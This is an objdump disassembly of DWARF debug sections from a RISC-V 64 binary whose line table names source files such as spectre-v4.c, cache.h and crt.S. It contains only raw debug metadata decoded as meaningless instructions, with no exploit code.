 640:	3f01                	addiw	t5,t5,-32
 642:	0319                	addi	t1,t1,6
 644:	3a0e                	fld	fs4,224(sp)
 646:	390b3b0b          	0x390b3b0b
 64a:	1119270b          	0x1119270b
 64e:	1201                	addi	tp,tp,-32
 650:	97184007          	flq	ft0,-1679(a6)
 654:	1942                	slli	s2,s2,0x30
 656:	1301                	addi	t1,t1,-32
 658:	0000                	unimp
 65a:	3f002e3f 3a0e0319 	0x3a0e03193f002e3f
 662:	390b3b0b          	0x390b3b0b
 666:	1201110b          	0x1201110b
 66a:	96184007          	flq	ft0,-1695(a6)
 66e:	1942                	slli	s2,s2,0x30
 670:	0000                	unimp
 672:	2e40                	fld	fs0,152(a2)
 674:	3f01                	addiw	t5,t5,-32
 676:	0319                	addi	t1,t1,6
 678:	3a0e                	fld	fs4,224(sp)
 67a:	390b3b0b          	0x390b3b0b
 67e:	8719270b          	0x8719270b
 682:	1901                	addi	s2,s2,-32
 684:	0111                	addi	sp,sp,4
 686:	0712                	slli	a4,a4,0x4
 688:	1840                	addi	s0,sp,52
 68a:	4296                	lw	t0,68(sp)
 68c:	0119                	addi	sp,sp,6
 68e:	41000013          	li	zero,1040
 692:	012e                	slli	sp,sp,0xb
 694:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 69c:	0b39                	addi	s6,s6,14
 69e:	01871927          	0x1871927
 6a2:	1119                	addi	sp,sp,-26
 6a4:	1201                	addi	tp,tp,-32
 6a6:	97184007          	flq	ft0,-1679(a6)
 6aa:	1942                	slli	s2,s2,0x30
 6ac:	1301                	addi	t1,t1,-32
 6ae:	0000                	unimp
 6b0:	3442                	fld	fs0,48(sp)
 6b2:	0300                	addi	s0,sp,384
 6b4:	3a0e                	fld	fs4,224(sp)
 6b6:	390b3b0b          	0x390b3b0b
 6ba:	8813490b          	0x8813490b
 6be:	0b01                	addi	s6,s6,0
 6c0:	1802                	slli	a6,a6,0x20
 6c2:	0000                	unimp
 6c4:	03012e43          	fmadd.d	ft8,ft2,fa6,ft0,rdn
 6c8:	3a0e                	fld	fs4,224(sp)
 6ca:	390b3b0b          	0x390b3b0b
 6ce:	1119270b          	0x1119270b
 6d2:	1201                	addi	tp,tp,-32
 6d4:	97184007          	flq	ft0,-1679(a6)
 6d8:	1942                	slli	s2,s2,0x30
 6da:	1301                	addi	t1,t1,-32
 6dc:	0000                	unimp
 6de:	2e44                	fld	fs1,152(a2)
 6e0:	0301                	addi	t1,t1,0
 6e2:	3a0e                	fld	fs4,224(sp)
 6e4:	390b3b0b          	0x390b3b0b
 6e8:	1119270b          	0x1119270b
 6ec:	1201                	addi	tp,tp,-32
 6ee:	97184007          	flq	ft0,-1679(a6)
 6f2:	1942                	slli	s2,s2,0x30
 6f4:	0000                	unimp
	...

Disassembly of section .debug_aranges:

0000000000000000 <.debug_aranges>:
   0:	002c                	addi	a1,sp,8
   2:	0000                	unimp
   4:	0002                	c.slli	zero,0x0
   6:	0000                	unimp
   8:	0000                	unimp
   a:	0008                	0x8
   c:	0000                	unimp
   e:	0000                	unimp
  10:	1048                	addi	a0,sp,36
  12:	8000                	0x8000
  14:	0000                	unimp
  16:	0000                	unimp
  18:	0532                	slli	a0,a0,0xc
	...
  2e:	0000                	unimp
  30:	002c                	addi	a1,sp,8
  32:	0000                	unimp
  34:	0002                	c.slli	zero,0x0
  36:	0d62                	slli	s10,s10,0x18
  38:	0000                	unimp
  3a:	0008                	0x8
  3c:	0000                	unimp
  3e:	0000                	unimp
  40:	0000                	unimp
  42:	8000                	0x8000
  44:	0000                	unimp
  46:	0000                	unimp
  48:	01c6                	slli	gp,gp,0x11
	...
  5e:	0000                	unimp
  60:	002c                	addi	a1,sp,8
  62:	0000                	unimp
  64:	0002                	c.slli	zero,0x0
  66:	0d90                	addi	a2,sp,720
  68:	0000                	unimp
  6a:	0008                	0x8
  6c:	0000                	unimp
  6e:	0000                	unimp
  70:	157a                	slli	a0,a0,0x3e
  72:	8000                	0x8000
  74:	0000                	unimp
  76:	0000                	unimp
  78:	002e                	c.slli	zero,0xb
	...
  8e:	0000                	unimp
  90:	002c                	addi	a1,sp,8
  92:	0000                	unimp
  94:	0002                	c.slli	zero,0x0
  96:	0dbe                	slli	s11,s11,0xf
  98:	0000                	unimp
  9a:	0008                	0x8
  9c:	0000                	unimp
  9e:	0000                	unimp
  a0:	15a8                	addi	a0,sp,744
  a2:	8000                	0x8000
  a4:	0000                	unimp
  a6:	0000                	unimp
  a8:	1214                	addi	a3,sp,288
	...

Disassembly of section .debug_line:

0000000000000000 <.debug_line>:
       0:	03c1                	addi	t2,t2,16
       2:	0000                	unimp
       4:	0002                	c.slli	zero,0x0
       6:	0119                	addi	sp,sp,6
       8:	0000                	unimp
       a:	0101                	addi	sp,sp,0
       c:	000d0efb          	0xd0efb
      10:	0101                	addi	sp,sp,0
      12:	0101                	addi	sp,sp,0
      14:	0000                	unimp
      16:	0100                	addi	s0,sp,128
      18:	0000                	unimp
      1a:	6901                	0x6901
      1c:	636e                	ld	t1,216(sp)
      1e:	7300                	ld	s0,32(a4)
      20:	6372                	ld	t1,280(sp)
      22:	2f00                	fld	fs0,24(a4)
      24:	2f74706f          	j	47b1a <_tbss_end+0x47a96>
      28:	6972                	ld	s2,280(sp)
      2a:	36766373          	csrrsi	t1,0x367,12
      2e:	2f34                	fld	fa3,88(a4)
      30:	6972                	ld	s2,280(sp)
      32:	36766373          	csrrsi	t1,0x367,12
      36:	2d34                	fld	fa3,88(a0)
      38:	6e75                	lui	t3,0x1d
      3a:	776f6e6b          	0x776f6e6b
      3e:	2d6e                	fld	fs10,216(sp)
      40:	6c65                	lui	s8,0x19
      42:	2f66                	fld	ft10,88(sp)
      44:	6e69                	lui	t3,0x1a
      46:	64756c63          	bltu	a0,t2,69e <_tbss_end+0x61a>
      4a:	2f65                	addiw	t5,t5,25
      4c:	616d                	addi	sp,sp,240
      4e:	6e696863          	bltu	s2,t1,73e <_tbss_end+0x6ba>
      52:	0065                	c.nop	25
      54:	74706f2f          	0x74706f2f
      58:	7369722f          	0x7369722f
      5c:	34367663          	bleu	gp,a2,3a8 <_tbss_end+0x324>
      60:	7369722f          	0x7369722f
      64:	34367663          	bleu	gp,a2,3b0 <_tbss_end+0x32c>
      68:	752d                	lui	a0,0xfffeb
      6a:	6b6e                	ld	s6,216(sp)
      6c:	6f6e                	ld	t5,216(sp)
      6e:	652d6e77          	0x652d6e77
      72:	666c                	ld	a1,200(a2)
      74:	636e692f          	0x636e692f
      78:	756c                	ld	a1,232(a0)
      7a:	6564                	ld	s1,200(a0)
      7c:	7379732f          	0x7379732f
      80:	2f00                	fld	fs0,24(a4)
      82:	2f74706f          	j	47b78 <_tbss_end+0x47af4>
      86:	6972                	ld	s2,280(sp)
      88:	36766373          	csrrsi	t1,0x367,12
      8c:	2f34                	fld	fa3,88(a4)
      8e:	696c                	ld	a1,208(a0)
      90:	2f62                	fld	ft10,24(sp)
      92:	2f636367          	0x2f636367
      96:	6972                	ld	s2,280(sp)
      98:	36766373          	csrrsi	t1,0x367,12
      9c:	2d34                	fld	fa3,88(a0)
      9e:	6e75                	lui	t3,0x1d
      a0:	776f6e6b          	0x776f6e6b
      a4:	2d6e                	fld	fs10,216(sp)
      a6:	6c65                	lui	s8,0x19
      a8:	2f66                	fld	ft10,88(sp)
      aa:	2e322e37          	lui	t3,0x2e322
      ae:	2f30                	fld	fa2,88(a4)
      b0:	6e69                	lui	t3,0x1a
      b2:	64756c63          	bltu	a0,t2,70a <_tbss_end+0x686>
      b6:	0065                	c.nop	25
      b8:	6300                	ld	s0,0(a4)
      ba:	6361                	lui	t1,0x18
      bc:	6568                	ld	a0,200(a0)
      be:	682e                	ld	a6,200(sp)
      c0:	0100                	addi	s0,sp,128
      c2:	0000                	unimp
      c4:	63657073          	csrci	0x636,10
      c8:	7274                	ld	a3,224(a2)
      ca:	2d65                	addiw	s10,s10,25
      cc:	3476                	fld	fs0,376(sp)
      ce:	632e                	ld	t1,200(sp)
      d0:	0200                	addi	s0,sp,256
      d2:	0000                	unimp
      d4:	645f 6665 7561      	0x75616665645f
      da:	746c                	ld	a1,232(s0)
      dc:	745f 7079 7365      	0x73657079745f
      e2:	682e                	ld	a6,200(sp)
      e4:	0300                	addi	s0,sp,384
      e6:	0000                	unimp
      e8:	6f6c                	ld	a1,216(a4)
      ea:	682e6b63          	bltu	t3,sp,780 <_tbss_end+0x6fc>
      ee:	0400                	addi	s0,sp,512
      f0:	0000                	unimp
      f2:	745f 7079 7365      	0x73657079745f
      f8:	682e                	ld	a6,200(sp)
      fa:	0400                	addi	s0,sp,512
      fc:	0000                	unimp
      fe:	64647473          	csrrci	s0,0x646,8
     102:	6665                	lui	a2,0x19
     104:	682e                	ld	a6,200(sp)
     106:	0500                	addi	s0,sp,640
     108:	0000                	unimp
     10a:	6572                	ld	a0,280(sp)
     10c:	6e65                	lui	t3,0x19
     10e:	2e74                	fld	fa3,216(a2)
     110:	0068                	addi	a0,sp,12
     112:	0004                	0x4
     114:	5f00                	lw	s0,56(a4)
     116:	69647473          	csrrci	s0,0x696,8
     11a:	746e                	ld	s0,248(sp)
     11c:	682e                	ld	a6,200(sp)
     11e:	0400                	addi	s0,sp,512
     120:	0000                	unimp
     122:	0000                	unimp
     124:	0209                	addi	tp,tp,2
     126:	1048                	addi	a0,sp,36
     128:	8000                	0x8000
     12a:	0000                	unimp
     12c:	0000                	unimp
     12e:	0100c603          	lbu	a2,16(ra) # 4010 <_tbss_end+0x3f8c>
     132:	0e090503          	lb	a0,224(s2) # 654c <_tbss_end+0x64c8>
     136:	0100                	addi	s0,sp,128
     138:	0a090103          	lb	sp,160(s2)
     13c:	0100                	addi	s0,sp,128
     13e:	0a090203          	lb	tp,160(s2)
     142:	0100                	addi	s0,sp,128
     144:	0a090303          	lb	t1,160(s2)
     148:	0100                	addi	s0,sp,128
     14a:	0c090303          	lb	t1,192(s2)
     14e:	0100                	addi	s0,sp,128
     150:	08090603          	lb	a2,128(s2)
     154:	0100                	addi	s0,sp,128
     156:	04090603          	lb	a2,64(s2)
     15a:	0100                	addi	s0,sp,128
     15c:	14090303          	lb	t1,320(s2)
     160:	0100                	addi	s0,sp,128
     162:	06090303          	lb	t1,96(s2)
     166:	0100                	addi	s0,sp,128
     168:	16090403          	lb	s0,352(s2)
     16c:	0100                	addi	s0,sp,128
     16e:	0200                	addi	s0,sp,256
     170:	0304                	addi	s1,sp,384
     172:	06090303          	lb	t1,96(s2)
     176:	0100                	addi	s0,sp,128
     178:	0200                	addi	s0,sp,256
     17a:	0304                	addi	s1,sp,384
     17c:	0a090403          	lb	s0,160(s2)
     180:	0100                	addi	s0,sp,128
     182:	0200                	addi	s0,sp,256
     184:	0304                	addi	s1,sp,384
     186:	18097903          	0x18097903
     18a:	0100                	addi	s0,sp,128
     18c:	0200                	addi	s0,sp,256
     18e:	0104                	addi	s1,sp,128
     190:	0306                	slli	t1,t1,0x1
     192:	0900                	addi	s0,sp,144
     194:	000a                	c.slli	zero,0x2
     196:	0001                	nop
     198:	0402                	slli	s0,s0,0x0
     19a:	0602                	slli	a2,a2,0x0
     19c:	0a097903          	0xa097903
     1a0:	0100                	addi	s0,sp,128
     1a2:	0200                	addi	s0,sp,256
     1a4:	0104                	addi	s1,sp,128
     1a6:	0306                	slli	t1,t1,0x1
     1a8:	0900                	addi	s0,sp,144
     1aa:	000a                	c.slli	zero,0x2
     1ac:	0601                	addi	a2,a2,0
     1ae:	0c091203          	lh	tp,192(s2)
     1b2:	0100                	addi	s0,sp,128
     1b4:	0204                	addi	s1,sp,256
     1b6:	097fbb03          	ld	s6,151(t6) # 4097 <_tbss_end+0x4013>
     1ba:	0008                	0x8
     1bc:	0301                	addi	t1,t1,0
     1be:	0901                	addi	s2,s2,0
     1c0:	0016                	c.slli	zero,0x5
     1c2:	0301                	addi	t1,t1,0
     1c4:	0901                	addi	s2,s2,0
     1c6:	0008                	0x8
     1c8:	0301                	addi	t1,t1,0
     1ca:	0902                	slli	s2,s2,0x0
     1cc:	000a                	c.slli	zero,0x2
     1ce:	0301                	addi	t1,t1,0
     1d0:	0901                	addi	s2,s2,0
     1d2:	0006                	c.slli	zero,0x1
     1d4:	0301                	addi	t1,t1,0
     1d6:	0901                	addi	s2,s2,0
     1d8:	0018                	0x18
     1da:	0301                	addi	t1,t1,0
     1dc:	0901                	addi	s2,s2,0
     1de:	000e                	c.slli	zero,0x3
     1e0:	0301                	addi	t1,t1,0
     1e2:	0901                	addi	s2,s2,0
     1e4:	0014                	0x14
     1e6:	0301                	addi	t1,t1,0
     1e8:	0901                	addi	s2,s2,0
     1ea:	0012                	c.slli	zero,0x4
     1ec:	0301                	addi	t1,t1,0
     1ee:	0902                	slli	s2,s2,0x0
     1f0:	0012                	c.slli	zero,0x4
     1f2:	0301                	addi	t1,t1,0
     1f4:	0901                	addi	s2,s2,0
     1f6:	001a                	c.slli	zero,0x6
     1f8:	0301                	addi	t1,t1,0
     1fa:	0901                	addi	s2,s2,0
     1fc:	0016                	c.slli	zero,0x5
     1fe:	0001                	nop
     200:	0402                	slli	s0,s0,0x0
     202:	0302                	slli	t1,t1,0x0
     204:	00120977          	0x120977
     208:	0001                	nop
     20a:	0402                	slli	s0,s0,0x0
     20c:	0601                	addi	a2,a2,0
     20e:	0a090003          	lb	zero,160(s2)
     212:	0100                	addi	s0,sp,128
     214:	0306                	slli	t1,t1,0x1
     216:	090c                	addi	a1,sp,144
     218:	000c                	0xc
     21a:	0301                	addi	t1,t1,0
     21c:	0909                	addi	s2,s2,2
     21e:	0008                	0x8
     220:	0301                	addi	t1,t1,0
     222:	0901                	addi	s2,s2,0
     224:	000a                	c.slli	zero,0x2
     226:	0301                	addi	t1,t1,0
     228:	000e0903          	lb	s2,0(t3) # 19000 <_tbss_end+0x18f7c>
     22c:	0301                	addi	t1,t1,0
     22e:	0901                	addi	s2,s2,0
     230:	0010                	0x10
     232:	0301                	addi	t1,t1,0
     234:	090e                	slli	s2,s2,0x3
     236:	003e                	c.slli	zero,0xf
     238:	0301                	addi	t1,t1,0
     23a:	0901                	addi	s2,s2,0
     23c:	0016                	c.slli	zero,0x5
     23e:	0301                	addi	t1,t1,0
     240:	0902                	slli	s2,s2,0x0
     242:	0046                	c.slli	zero,0x11
     244:	0301                	addi	t1,t1,0
     246:	0901                	addi	s2,s2,0
     248:	0018                	0x18
     24a:	0301                	addi	t1,t1,0
     24c:	0904                	addi	s1,sp,144
     24e:	0008                	0x8
     250:	0301                	addi	t1,t1,0
     252:	0901                	addi	s2,s2,0
     254:	0008                	0x8
     256:	0301                	addi	t1,t1,0
     258:	0904                	addi	s1,sp,144
     25a:	001c                	0x1c
     25c:	0301                	addi	t1,t1,0
     25e:	0901                	addi	s2,s2,0
     260:	000c                	0xc
     262:	0301                	addi	t1,t1,0
     264:	00180903          	lb	s2,1(a6)
     268:	0301                	addi	t1,t1,0
     26a:	0904                	addi	s1,sp,144
     26c:	0006                	c.slli	zero,0x1
     26e:	0001                	nop
     270:	0402                	slli	s0,s0,0x0
     272:	09020303          	lb	t1,144(tp) # ffffffffffff8090 <_end+0xffffffff7ffdc410>
     276:	0006                	c.slli	zero,0x1
     278:	0001                	nop
     27a:	0402                	slli	s0,s0,0x0
     27c:	097e0303          	lb	t1,151(t3)
     280:	0014                	0x14
     282:	0001                	nop
     284:	0402                	slli	s0,s0,0x0
     286:	0601                	addi	a2,a2,0
     288:	0a090003          	lb	zero,160(s2)
     28c:	0100                	addi	s0,sp,128
     28e:	0306                	slli	t1,t1,0x1
     290:	0906                	slli	s2,s2,0x1
     292:	000c                	0xc
     294:	0301                	addi	t1,t1,0
     296:	0904                	addi	s1,sp,144
     298:	0006                	c.slli	zero,0x1
     29a:	0301                	addi	t1,t1,0
     29c:	0901                	addi	s2,s2,0
     29e:	0010                	0x10
     2a0:	0301                	addi	t1,t1,0
     2a2:	0904                	addi	s1,sp,144
     2a4:	0008                	0x8
     2a6:	0301                	addi	t1,t1,0
     2a8:	0902                	slli	s2,s2,0x0
     2aa:	0006                	c.slli	zero,0x1
     2ac:	0301                	addi	t1,t1,0
     2ae:	0901                	addi	s2,s2,0
     2b0:	0004                	0x4
     2b2:	0301                	addi	t1,t1,0
     2b4:	0901                	addi	s2,s2,0
     2b6:	0010                	0x10
     2b8:	0301                	addi	t1,t1,0
     2ba:	0901                	addi	s2,s2,0
     2bc:	002a                	c.slli	zero,0xa
     2be:	0301                	addi	t1,t1,0
     2c0:	0902                	slli	s2,s2,0x0
     2c2:	0018                	0x18
     2c4:	0301                	addi	t1,t1,0
     2c6:	000c0903          	lb	s2,0(s8) # 19000 <_tbss_end+0x18f7c>
     2ca:	0001                	nop
     2cc:	0402                	slli	s0,s0,0x0
     2ce:	0302                	slli	t1,t1,0x0
     2d0:	0976                	slli	s2,s2,0x1d
     2d2:	0028                	addi	a0,sp,8
     2d4:	0001                	nop
     2d6:	0402                	slli	s0,s0,0x0
     2d8:	0601                	addi	a2,a2,0
     2da:	0a090003          	lb	zero,160(s2)
     2de:	0100                	addi	s0,sp,128
     2e0:	0200                	addi	s0,sp,256
     2e2:	0204                	addi	s1,sp,256
     2e4:	0306                	slli	t1,t1,0x1
     2e6:	000c0977          	0xc0977
     2ea:	0001                	nop
     2ec:	0402                	slli	s0,s0,0x0
     2ee:	0601                	addi	a2,a2,0
     2f0:	0a090003          	lb	zero,160(s2)
     2f4:	0100                	addi	s0,sp,128
     2f6:	0306                	slli	t1,t1,0x1
     2f8:	000a091b          	sext.w	s2,s4
     2fc:	0301                	addi	t1,t1,0
     2fe:	0902                	slli	s2,s2,0x0
     300:	001c                	0x1c
     302:	0001                	nop
     304:	0402                	slli	s0,s0,0x0
     306:	0601                	addi	a2,a2,0
     308:	1e090003          	lb	zero,480(s2)
     30c:	0100                	addi	s0,sp,128
     30e:	0306                	slli	t1,t1,0x1
     310:	0901                	addi	s2,s2,0
     312:	001e                	c.slli	zero,0x7
     314:	0301                	addi	t1,t1,0
     316:	0901                	addi	s2,s2,0
     318:	0010                	0x10
     31a:	0301                	addi	t1,t1,0
     31c:	097f                	0x97f
     31e:	0014                	0x14
     320:	0301                	addi	t1,t1,0
     322:	0901                	addi	s2,s2,0
     324:	0008                	0x8
     326:	0301                	addi	t1,t1,0
     328:	097f                	0x97f
     32a:	0004                	0x4
     32c:	0301                	addi	t1,t1,0
     32e:	0901                	addi	s2,s2,0
     330:	0004                	0x4
     332:	0301                	addi	t1,t1,0
     334:	097f                	0x97f
     336:	0004                	0x4
     338:	0301                	addi	t1,t1,0
     33a:	0902                	slli	s2,s2,0x0
     33c:	0008                	0x8
     33e:	0301                	addi	t1,t1,0
     340:	097e                	slli	s2,s2,0x1f
     342:	0004                	0x4
     344:	0301                	addi	t1,t1,0
     346:	0902                	slli	s2,s2,0x0
     348:	0004                	0x4
     34a:	0301                	addi	t1,t1,0
     34c:	097e                	slli	s2,s2,0x1f
     34e:	0004                	0x4
     350:	0301                	addi	t1,t1,0
     352:	0904                	addi	s1,sp,144
     354:	0014                	0x14
     356:	0301                	addi	t1,t1,0
     358:	0901                	addi	s2,s2,0
     35a:	0010                	0x10
     35c:	0301                	addi	t1,t1,0
     35e:	097f                	0x97f
     360:	0014                	0x14
     362:	0301                	addi	t1,t1,0
     364:	0901                	addi	s2,s2,0
     366:	0008                	0x8
     368:	0301                	addi	t1,t1,0
     36a:	097f                	0x97f
     36c:	0004                	0x4
     36e:	0301                	addi	t1,t1,0
     370:	0901                	addi	s2,s2,0
     372:	0004                	0x4
     374:	0301                	addi	t1,t1,0
     376:	097f                	0x97f
     378:	0004                	0x4
     37a:	0301                	addi	t1,t1,0
     37c:	0902                	slli	s2,s2,0x0
     37e:	0008                	0x8
     380:	0301                	addi	t1,t1,0
     382:	097e                	slli	s2,s2,0x1f
     384:	0004                	0x4
     386:	0301                	addi	t1,t1,0
     388:	0902                	slli	s2,s2,0x0
     38a:	0004                	0x4
     38c:	0301                	addi	t1,t1,0
     38e:	097e                	slli	s2,s2,0x1f
     390:	0004                	0x4
     392:	0001                	nop
     394:	0402                	slli	s0,s0,0x0
     396:	0302                	slli	t1,t1,0x0
     398:	0905                	addi	s2,s2,1
     39a:	0012                	c.slli	zero,0x4
     39c:	0001                	nop
     39e:	0402                	slli	s0,s0,0x0
     3a0:	0302                	slli	t1,t1,0x0
     3a2:	000a094f          	fnmadd.s	fs2,fs4,ft0,ft0,rne
     3a6:	0001                	nop
     3a8:	0402                	slli	s0,s0,0x0
     3aa:	0601                	addi	a2,a2,0
     3ac:	0a090003          	lb	zero,160(s2)
     3b0:	0100                	addi	s0,sp,128
     3b2:	0306                	slli	t1,t1,0x1
     3b4:	0934                	addi	a3,sp,152
     3b6:	000a                	c.slli	zero,0x2
     3b8:	0301                	addi	t1,t1,0
     3ba:	0901                	addi	s2,s2,0
     3bc:	0002                	c.slli	zero,0x0
     3be:	0901                	addi	s2,s2,0
     3c0:	000a                	c.slli	zero,0x2
     3c2:	0100                	addi	s0,sp,128
     3c4:	f401                	bnez	s0,2cc <_tbss_end+0x248>
     3c6:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     3ca:	2000                	fld	fs0,0(s0)
     3cc:	0000                	unimp
     3ce:	0100                	addi	s0,sp,128
     3d0:	fb01                	bnez	a4,2e0 <_tbss_end+0x25c>
     3d2:	0d0e                	slli	s10,s10,0x3
     3d4:	0100                	addi	s0,sp,128
     3d6:	0101                	addi	sp,sp,0
     3d8:	0001                	nop
     3da:	0000                	unimp
     3dc:	0001                	nop
     3de:	0100                	addi	s0,sp,128
     3e0:	00637273          	csrrci	tp,0x6,6
     3e4:	6300                	ld	s0,0(a4)
     3e6:	7472                	ld	s0,312(sp)
     3e8:	532e                	lw	t1,232(sp)
     3ea:	0100                	addi	s0,sp,128
     3ec:	0000                	unimp
     3ee:	0000                	unimp
     3f0:	0209                	addi	tp,tp,2
     3f2:	0000                	unimp
     3f4:	8000                	0x8000
     3f6:	0000                	unimp
     3f8:	0000                	unimp
     3fa:	03011103          	lh	sp,48(sp) # 50b017e <_tbss_end+0x50b00fa>
     3fe:	0901                	addi	s2,s2,0
     400:	0002                	c.slli	zero,0x0
     402:	0301                	addi	t1,t1,0
     404:	0901                	addi	s2,s2,0
     406:	0002                	c.slli	zero,0x0
     408:	0301                	addi	t1,t1,0
     40a:	0901                	addi	s2,s2,0
     40c:	0002                	c.slli	zero,0x0
     40e:	0301                	addi	t1,t1,0
     410:	0901                	addi	s2,s2,0
     412:	0002                	c.slli	zero,0x0
     414:	0301                	addi	t1,t1,0
     416:	0901                	addi	s2,s2,0
     418:	0002                	c.slli	zero,0x0
     41a:	0301                	addi	t1,t1,0
     41c:	0901                	addi	s2,s2,0
     41e:	0002                	c.slli	zero,0x0
     420:	0301                	addi	t1,t1,0
     422:	0901                	addi	s2,s2,0
     424:	0002                	c.slli	zero,0x0
     426:	0301                	addi	t1,t1,0
     428:	0901                	addi	s2,s2,0
     42a:	0002                	c.slli	zero,0x0
     42c:	0301                	addi	t1,t1,0
     42e:	0901                	addi	s2,s2,0
     430:	0002                	c.slli	zero,0x0
     432:	0301                	addi	t1,t1,0
     434:	0901                	addi	s2,s2,0
     436:	0002                	c.slli	zero,0x0
     438:	0301                	addi	t1,t1,0
     43a:	0901                	addi	s2,s2,0
     43c:	0002                	c.slli	zero,0x0
     43e:	0301                	addi	t1,t1,0
     440:	0901                	addi	s2,s2,0
     442:	0002                	c.slli	zero,0x0
     444:	0301                	addi	t1,t1,0
     446:	0901                	addi	s2,s2,0
     448:	0002                	c.slli	zero,0x0
     44a:	0301                	addi	t1,t1,0
     44c:	0901                	addi	s2,s2,0
     44e:	0002                	c.slli	zero,0x0
     450:	0301                	addi	t1,t1,0
     452:	0901                	addi	s2,s2,0
     454:	0002                	c.slli	zero,0x0
     456:	0301                	addi	t1,t1,0
     458:	0901                	addi	s2,s2,0
     45a:	0002                	c.slli	zero,0x0
     45c:	0301                	addi	t1,t1,0
     45e:	0901                	addi	s2,s2,0
     460:	0002                	c.slli	zero,0x0
     462:	0301                	addi	t1,t1,0
     464:	0901                	addi	s2,s2,0
     466:	0002                	c.slli	zero,0x0
     468:	0301                	addi	t1,t1,0
     46a:	0901                	addi	s2,s2,0
     46c:	0002                	c.slli	zero,0x0
     46e:	0301                	addi	t1,t1,0
     470:	0901                	addi	s2,s2,0
     472:	0002                	c.slli	zero,0x0
     474:	0301                	addi	t1,t1,0
     476:	0901                	addi	s2,s2,0
     478:	0002                	c.slli	zero,0x0
     47a:	0301                	addi	t1,t1,0
     47c:	0901                	addi	s2,s2,0
     47e:	0002                	c.slli	zero,0x0
     480:	0301                	addi	t1,t1,0
     482:	0901                	addi	s2,s2,0
     484:	0002                	c.slli	zero,0x0
     486:	0301                	addi	t1,t1,0
     488:	0901                	addi	s2,s2,0
     48a:	0002                	c.slli	zero,0x0
     48c:	0301                	addi	t1,t1,0
     48e:	0901                	addi	s2,s2,0
     490:	0002                	c.slli	zero,0x0
     492:	0301                	addi	t1,t1,0
     494:	0901                	addi	s2,s2,0
     496:	0002                	c.slli	zero,0x0
     498:	0301                	addi	t1,t1,0
     49a:	0901                	addi	s2,s2,0
     49c:	0002                	c.slli	zero,0x0
     49e:	0301                	addi	t1,t1,0
     4a0:	0901                	addi	s2,s2,0
     4a2:	0002                	c.slli	zero,0x0
     4a4:	0301                	addi	t1,t1,0
     4a6:	0901                	addi	s2,s2,0
     4a8:	0002                	c.slli	zero,0x0
     4aa:	0301                	addi	t1,t1,0
     4ac:	0901                	addi	s2,s2,0
     4ae:	0002                	c.slli	zero,0x0
     4b0:	0301                	addi	t1,t1,0
     4b2:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     4b6:	0301                	addi	t1,t1,0
     4b8:	0901                	addi	s2,s2,0
     4ba:	0002                	c.slli	zero,0x0
     4bc:	0301                	addi	t1,t1,0
     4be:	00040903          	lb	s2,0(s0) # ffffffffffffa000 <_end+0xffffffff7ffde380>
     4c2:	0301                	addi	t1,t1,0
     4c4:	0902                	slli	s2,s2,0x0
     4c6:	0002                	c.slli	zero,0x0
     4c8:	0301                	addi	t1,t1,0
     4ca:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     4ce:	0301                	addi	t1,t1,0
     4d0:	0906                	slli	s2,s2,0x1
     4d2:	0004                	0x4
     4d4:	0301                	addi	t1,t1,0
     4d6:	0901                	addi	s2,s2,0
     4d8:	0002                	c.slli	zero,0x0
     4da:	0301                	addi	t1,t1,0
     4dc:	0901                	addi	s2,s2,0
     4de:	0008                	0x8
     4e0:	0301                	addi	t1,t1,0
     4e2:	0904                	addi	s1,sp,144
     4e4:	0002                	c.slli	zero,0x0
     4e6:	0301                	addi	t1,t1,0
     4e8:	00080903          	lb	s2,0(a6)
     4ec:	0301                	addi	t1,t1,0
     4ee:	00040903          	lb	s2,0(s0)
     4f2:	0301                	addi	t1,t1,0
     4f4:	0902                	slli	s2,s2,0x0
     4f6:	0004                	0x4
     4f8:	0301                	addi	t1,t1,0
     4fa:	0901                	addi	s2,s2,0
     4fc:	0004                	0x4
     4fe:	0301                	addi	t1,t1,0
     500:	0901                	addi	s2,s2,0
     502:	0004                	0x4
     504:	0301                	addi	t1,t1,0
     506:	0901                	addi	s2,s2,0
     508:	0004                	0x4
     50a:	0301                	addi	t1,t1,0
     50c:	0901                	addi	s2,s2,0
     50e:	0004                	0x4
     510:	0301                	addi	t1,t1,0
     512:	0901                	addi	s2,s2,0
     514:	0004                	0x4
     516:	0301                	addi	t1,t1,0
     518:	0901                	addi	s2,s2,0
     51a:	0004                	0x4
     51c:	0301                	addi	t1,t1,0
     51e:	0901                	addi	s2,s2,0
     520:	0004                	0x4
     522:	0301                	addi	t1,t1,0
     524:	0901                	addi	s2,s2,0
     526:	0004                	0x4
     528:	0301                	addi	t1,t1,0
     52a:	0901                	addi	s2,s2,0
     52c:	0004                	0x4
     52e:	0301                	addi	t1,t1,0
     530:	0901                	addi	s2,s2,0
     532:	0004                	0x4
     534:	0301                	addi	t1,t1,0
     536:	0901                	addi	s2,s2,0
     538:	0004                	0x4
     53a:	0301                	addi	t1,t1,0
     53c:	0901                	addi	s2,s2,0
     53e:	0004                	0x4
     540:	0301                	addi	t1,t1,0
     542:	0901                	addi	s2,s2,0
     544:	0004                	0x4
     546:	0301                	addi	t1,t1,0
     548:	0901                	addi	s2,s2,0
     54a:	0004                	0x4
     54c:	0301                	addi	t1,t1,0
     54e:	0901                	addi	s2,s2,0
     550:	0004                	0x4
     552:	0301                	addi	t1,t1,0
     554:	0901                	addi	s2,s2,0
     556:	0004                	0x4
     558:	0301                	addi	t1,t1,0
     55a:	0901                	addi	s2,s2,0
     55c:	0004                	0x4
     55e:	0301                	addi	t1,t1,0
     560:	0901                	addi	s2,s2,0
     562:	0004                	0x4
     564:	0301                	addi	t1,t1,0
     566:	0901                	addi	s2,s2,0
     568:	0004                	0x4
     56a:	0301                	addi	t1,t1,0
     56c:	0901                	addi	s2,s2,0
     56e:	0004                	0x4
     570:	0301                	addi	t1,t1,0
     572:	0901                	addi	s2,s2,0
     574:	0004                	0x4
     576:	0301                	addi	t1,t1,0
     578:	0901                	addi	s2,s2,0
     57a:	0004                	0x4
     57c:	0301                	addi	t1,t1,0
     57e:	0901                	addi	s2,s2,0
     580:	0004                	0x4
     582:	0301                	addi	t1,t1,0
     584:	0901                	addi	s2,s2,0
     586:	0004                	0x4
     588:	0301                	addi	t1,t1,0
     58a:	0901                	addi	s2,s2,0
     58c:	0004                	0x4
     58e:	0301                	addi	t1,t1,0
     590:	0901                	addi	s2,s2,0
     592:	0004                	0x4
     594:	0301                	addi	t1,t1,0
     596:	0901                	addi	s2,s2,0
